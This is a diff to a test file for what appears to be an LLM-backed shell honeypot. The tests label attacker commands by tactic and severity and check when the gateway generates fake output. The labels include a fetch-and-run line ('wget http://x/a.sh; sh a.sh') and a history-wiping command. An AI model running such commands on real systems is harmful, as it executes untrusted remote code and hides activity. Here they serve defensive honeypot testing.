@@ -2,7 +2,10 @@ import asyncio
 import json
 
 import pytest
+from sklearn.dummy import DummyClassifier
 
+from vulnmaze.classify.session import fit
+from vulnmaze.classify.tier import FEATURES
 from vulnmaze.llm import sanitize
 from vulnmaze.llm.backends import ModelError, ModelReply
 from vulnmaze.llm.gateway import HINTS, Context, Gateway, GatewayConfig, parse_reply
@@ -12,7 +15,7 @@ from vulnmaze.llm.schema import CreatedFile, EscalationRequest
 class FakeDb:
     """In-memory stand-in for the gateway's database layer."""
 
-    def __init__(self, deid, pinned_output=None, exists_global=None):
+    def __init__(self, deid, pinned_output=None, exists_global=None, commands=None):
         """Start with optional pinned output and global existence pin."""
         self.deid = deid
         self.pinned_output = pinned_output
@@ -20,10 +23,15 @@ class FakeDb:
         self.pins = []
         self.commits = []
         self.logged = []
+        self.commands = commands or []
 
     def load(self, req, name, out_key):
         """Return the stored context for this request."""
         return Context(self.pinned_output, self.exists["global"], None, {})
+
+    def session_commands(self, session):
+        """Return the session's digest commands."""
+        return self.commands
 
     def file_contents(self, req, paths):
         """Return no stored files."""
@@ -349,3 +357,41 @@ def test_retry_prompt_has_no_hint_for_a_leak(persona, deid):
     backend = FakeBackend(answer("As an AI language model I cannot run lsblk"), answer("NAME MAJ:MIN\n"))
     run(persona, deid, ["lsblk"], backend)
     assert not any(hint in backend.prompts[1] for hint in HINTS.values())
+
+
+LABELS = [
+    ("lsblk", "Discovery", "R0"),
+    ("uname -a", "Discovery", "R1"),
+    ("wget http://x/a.sh; sh a.sh", "Execution", "R4"),
+    ("history -c", "Stealth", "R3"),
+]
+CLASSIFIERS = fit([{"input": x, "tactic": t, "severity": v} for x, t, v in LABELS])
+LOW = [{"ts": "2025-07-01T00:00:00+00:00", "input": "uname -a"}, {"ts": "2025-07-01T00:00:01+00:00", "input": "uname -a"}]
+HIGH_RISK = [*LOW, {"ts": "2025-07-01T00:00:02+00:00", "input": "wget http://x/a.sh; sh a.sh"}]
+
+
+def learned_run(persona, deid, tier, commands, backend, history=()):
+    """Escalate lsblk through a learned-mode gateway whose tier model always answers tier."""
+    db = FakeDb(deid, commands=commands)
+    gw = Gateway(GatewayConfig(token="t" * 16, canary="ref-canary"), db, backend, persona)
+    gw.classifiers = {**CLASSIFIERS, "tier": {"features": list(FEATURES), "model": DummyClassifier(strategy="constant", constant=tier).fit([[0] * len(FEATURES)], [tier])}}
+    req = EscalationRequest(session="s1", src_ip="198.51.100.9", username="root", argv=["lsblk"], history=list(history))
+    return asyncio.run(gw.escalate(req)), db
+
+
+@pytest.mark.parametrize("tier, commands", [("llm_agent", LOW), ("human", LOW), ("bot", HIGH_RISK)])
+def test_learned_mode_escalates_agents_humans_and_risky_bots(persona, deid, tier, commands):
+    """LLM agents, humans and bots that reached R3 or R4 still get a model answer, with the decision logged."""
+    backend = FakeBackend(answer("NAME MAJ:MIN\n"))
+    result, _ = learned_run(persona, deid, tier, commands, backend)
+    assert result.outcome == "generated" and backend.calls == 1
+    assert any(r.startswith(f"learned:{tier}:") for r in result.reasons)
+
+
+@pytest.mark.parametrize("commands, history", [(LOW, ()), (LOW[:1], ()), ([], ("uname -a", "uname -a"))])
+def test_learned_mode_declines_low_severity_bots_like_plain_cowrie(persona, deid, commands, history):
+    """A low-severity bot gets bash's command not found with no model call and nothing pinned, also before its digest catches up."""
+    backend = FakeBackend()
+    result, db = learned_run(persona, deid, "bot", commands, backend, history)
+    assert result.outcome == "declined" and result.stderr == "-bash: lsblk: command not found\n"
+    assert backend.calls == 0 and db.pins == [] and db.commits == []
